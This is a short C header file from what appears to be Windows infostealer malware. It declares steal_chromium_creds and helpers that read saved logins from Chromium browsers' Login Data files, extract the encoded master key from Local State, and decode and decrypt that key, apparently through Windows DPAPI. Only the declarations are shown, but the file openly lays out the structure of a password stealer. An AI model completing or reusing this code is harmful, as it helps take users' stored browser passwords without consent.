#ifndef CHROMIUM_H
#define CHROMIUM_H

#include <windows.h>
#include <winnt.h>

#include "logins.h"

typedef struct {
  PWSTR browserName;
  PWSTR loginDataPath;
  PWSTR localStatePath;
} BrowserInfo;

int steal_chromium_creds();
static int steal_browser_creds(BrowserInfo browser);
static int retrieve_logins(PWSTR fullPath, int *loginCountOut,
                           Login *loginsOut[]);
static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encryptedKeyOut);
static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
                      size_t *decodedKeySizeOut);
static int decrypt_key(BYTE *encryptedKey, size_t encryptedKeySize,
                       DATA_BLOB *decryptedKeyOut);

#endif
